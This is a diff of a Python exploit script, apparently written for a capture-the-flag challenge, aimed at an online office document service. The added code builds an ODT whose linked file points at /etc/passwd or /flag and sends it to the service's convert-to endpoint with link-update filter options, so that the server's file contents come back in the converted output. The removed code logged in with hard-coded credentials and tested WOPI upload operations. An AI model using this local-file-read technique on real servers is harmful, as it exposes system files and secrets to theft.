@@ -1,68 +1,55 @@
 #!/usr/bin/env python3
-"""Temporary CTF WOPI upload and document-operation probe."""
-import http.cookiejar
-import html
-import json
+"""Temporary CTF ODT type-detection and link-update probe."""
+import io
 import pathlib
-import re
 import urllib.error
-import urllib.parse
 import urllib.request
+import uuid
+import zipfile
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
-EMAIL = "arena-93aa1301@corp"
-PASSWORD = "Arena-93aa1301-CTF!"
-jar = http.cookiejar.CookieJar()
-opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+POC = pathlib.Path(__file__).with_name("poc.odt")
 
 
-def req(path, method="GET", data=None, headers=None, form=None, limit=100000):
-    url = urllib.parse.urljoin(BASE + "/", path)
-    if form is not None:
-        data = urllib.parse.urlencode(form).encode()
-        headers = {**(headers or {}), "Content-Type": "application/x-www-form-urlencoded"}
-    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
-    print("\n===", method, url, "DATA_BYTES", len(data or b""), "HEADERS", headers, flush=True)
+def payload(target):
+    out = io.BytesIO()
+    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
+        for info in zin.infolist():
+            data = zin.read(info.filename)
+            if info.filename == "content.xml":
+                data = data.replace(b"file:///etc/passwd", b"file://" + target.encode())
+                data = data.replace(b"<text:section", b"<text:p>ARENA_MARKER</text:p><text:section", 1)
+            zout.writestr(info, data)
+    return out.getvalue()
+
+
+def convert(filename, target, fields=None):
+    data = payload(target)
+    boundary = "----Arena" + uuid.uuid4().hex
+    prefix = b""
+    for name, value in (fields or {}).items():
+        prefix += f'--{boundary}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
+    body = prefix + (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
+        "Content-Type: application/octet-stream\r\n\r\n"
+    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
+    req = urllib.request.Request(BASE + "/cool/convert-to/txt", data=body, method="POST")
+    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
+    print("\n=== CONVERT", filename, target, fields, flush=True)
     try:
-        with opener.open(request, timeout=60) as r:
-            raw = r.read(limit)
-            text = raw.decode("utf-8", "replace")
-            print("STATUS", r.status, "FINAL", r.url, "HEADERS", r.headers, flush=True)
-            if len(raw) < 20000:
-                print("BODY", text, flush=True)
-            else:
-                for line in text.splitlines():
-                    if any(x in line for x in ("iframe", "doc-name", "error", "ctfcup", "BaseFileName")):
-                        print("MATCH", line, flush=True)
-            return r.status, r.url, raw, dict(r.headers)
+        with urllib.request.urlopen(req, timeout=90) as r:
+            raw = r.read(500000)
+            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
     except urllib.error.HTTPError as e:
-        raw = e.read(limit)
-        print("HTTP_ERROR", e.code, e.headers, "BODY", raw.decode("utf-8", "replace"), flush=True)
-        return e.code, e.url, raw, dict(e.headers)
+        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
+    except Exception as e:
+        print("ERROR", repr(e), flush=True)
 
 
-req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
-status, final, raw, _ = req("/docs/create", "POST", form={"folder": "", "title": "linked.odt"})
-docid = urllib.parse.urlsplit(final).path.rsplit("/", 1)[-1]
-print("DOCID", docid, flush=True)
-status, _, editor, _ = req("/edit/" + docid)
-match = re.search(rb'<iframe[^>]+src=["\']([^"\']+)', editor)
-token = ""
-if match:
-    iframe = html.unescape(match.group(1).decode())
-    token = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)["access_token"][0]
-print("TOKEN", token, flush=True)
-q = "?access_token=" + urllib.parse.quote(token)
-req("/wopi/files/" + docid + q)
-odt = pathlib.Path(__file__).with_name("poc.odt").read_bytes()
-req("/wopi/files/" + docid + "/contents" + q, "POST", odt,
-    {"Content-Type": "application/octet-stream", "X-WOPI-Override": "PUT"})
-req("/wopi/files/" + docid + "/contents" + q)
-for operation, extra in (
-    ("RENAME_FILE", {"X-WOPI-RequestedName": "renamed.odt"}),
-    ("PUT_RELATIVE", {"X-WOPI-RelativeTarget": "relative.odt"}),
-):
-    req("/wopi/files/" + docid + q, "POST", odt if operation == "PUT_RELATIVE" else None,
-        {"X-WOPI-Override": operation, **extra})
-    req("/wopi/files/" + docid + q)
-req("/")
+convert("probe.odt", "/etc/passwd")
+convert("probe.txt", "/etc/passwd")
+convert("probe.txt", "/etc/passwd", {"infilterOptions": "UpdateDocMode=1"})
+convert("probe.txt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
+convert("probe.odt", "/etc/passwd", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
+convert("probe.txt", "/flag", {"infilterOptions": '{"UpdateDocMode":{"type":"short","value":"1"}}'})
